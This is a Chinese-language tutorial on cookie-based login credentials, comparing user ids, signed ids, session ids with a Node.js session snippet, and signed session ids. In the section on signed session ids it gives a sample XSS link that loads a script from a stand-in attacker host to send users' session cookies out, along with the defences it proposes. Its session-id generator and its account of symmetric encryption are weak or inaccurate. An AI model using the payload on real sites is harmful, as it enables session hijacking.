#### cookie用户登录凭证的三种方法：
###### 1. 用户id

实现：直接用用户id作为cookie来进行登录凭证

缺点：
- 在没有设置httpoly的时候，前端可以随意的篡改cookie
- 并且用户凭证可能会是一个数据对象，存储起来也是很耗费存储空间的
- 并且每次请求的时候，都带上这样的cookie会导致流量与带宽的浪费，影响传输速度
- 并且这些数据是非常私密敏感的，一旦泄露，后果可能会很严重。


###### 2. 用户id + 签名

实现（利用nodejs的crypto签名）：服务端将用户id结合自己本机的签名（可以是随机数）用crypto签名之后得到一个签名后的字符串，将该字符串传入到一个cookie中，然后将用户id传入到一个cookie中。当用户再次访问该服务器的时候会自动带上这两个cookie，后端服务器会将用户id结合之前的签名用crypto加密之后得到一个签名后的字符串，该字符串如果和前端发送的cookie的值相等，说明前端没有串改用户id，验证通过。

安全性：该方法其实设置为httpoly就可以解决cookie被前端篡改，但是不能预防中间人篡改。

安全性的保证：只有本机知道的签名与加密算法。加密算法可以通过前后端进行协商确定，但是签名一定是服务器才知道的，如果泄漏了这种方法就失效了。

优点与缺点：这种方法可以防止前端篡改cookie，但是并没有解决存储浪费、网络资源浪费、传输速度问题、每次需要传输敏感数据的问题。针对这些问题，可以通过session来进行优化改善。


###### 3. sessionid

上面一系列的问题就是session存在的意义。session最主要的是可以避免每次都传递敏感数据，其次sessionid的随机性可以阻止前端篡改cookie之后导致身份被冒充，解决资源浪费。

实现：虽然将所有数据都放在cookie中不可取，但是将口令sessionid放在cookie中还是可以的。口令一旦篡改，就丢失了映射关系，也无法修改服务端存在的数据了。并且session的有效期较短。普遍设置为20分钟，如果在20分钟内客户端和服务器端没有交互产生，服务器端就将数据删除。由于数据过期较短，并且在服务器存储数据安全性相对较高。口令sessionid的产生可以是一个随机数，然后为这个sessionid设置一个过期时间，保存在服务端的session中。服务器接收到请求后，如果请求中没有对应的cookie键值对，则生成一个sessionid并set-cookie，这个值是唯一不重复的，并且有超时时间。下次请求到来就根据相应的cookie到session中存取数据，如果没有交互的时间间隔没有超时则重新设置超时时间，直到停止交互的时间间隔大于规定的时间间隔，此时就需要删除数据，重新设置一个sessionid。（session可以存储到缓存服务器中）


```
var sessions = {};
var key = 'session_id';
var EXPIRES = 20 * 60 * 1000;
var generate = function () {
var session = {};
    session.id = (new Date()).getTime() + Math.random();
    session.cookie = {
        expire: (new Date()).getTime() + EXPIRES
    };
    sessions[session.id] = session;
    return session;
};

function (req, res) {
    var id = req.cookies[key];
    if (!id) {
        req.session = generate();
    } else {
        var session = sessions[id];
        if (session) {
            if (session.cookie.expire > (new Date()).getTime()) {
            // 更新超时时间
            session.cookie.expire = (new Date()).getTime() + EXPIRES;
            req.session = session;
        } else {
            // 未交互的时间间隔超时，删除旧数据，重新生成sessionid
            delete sessions[id];
            req.session = generate();
            }
        } else {
            // 如果session过期或者口令不对，重新生成session
            req.session = generate();
        }
    }
    handle(req, res);
}
```


缺点：由于sessionid是随机生成的，有一定的几率命中

###### 4. sessionid + 签名

实现：将sessionid用服务端的私钥进行签名。

缺点：通过xss来获取存储了口令的sessionid，比如a.com获取url中的hash字段并设置到其网站上，攻击者将如下网址发给某个已经登录的在线用户：

```
http://a.com/pathname#<script src="http://b.com/c.js"></script>
```
下面这个网站压缩成短网址：

```
https://dwz.cn/jaMf29sO
```
当该用户点击这个网站的时候，会执行hash部分，将登录的用户的cookie发送到b.com的服务器，因此b服务器就可以获取到cookie中的口令，然后用这个口令向a服务器获取用户的数据。

防止攻击的方法：整个过程中，在访问短网址的时候，在a服务端中可以通过将特殊字符或者标签转译。然后设置cookie在同域的时候允许发送，这个时候b是无法获取到cookie的。假设前面都失效了，b获取到cookie之后，a可以通过referer来判断是否是一个攻击。


#### 加密与签名：

- 签名指的是，传输中存在一个明文以及一个签名字符串，如果这个明文被篡改了，那么后端根据这个篡改后的明文算出来的签名不会和之前的签名字符串相等。
- 加密指的是，传输中不会存在明文，而是一个加密的内容。比如后端发送一个公钥给客户端，客户端利用这个公钥对数据进行加密，只有后端与该公钥匹配的秘钥才能得到解密。这里是非对称加密，对称加密是加密解密都是公钥，这个公钥很容易被其他中间人获取。


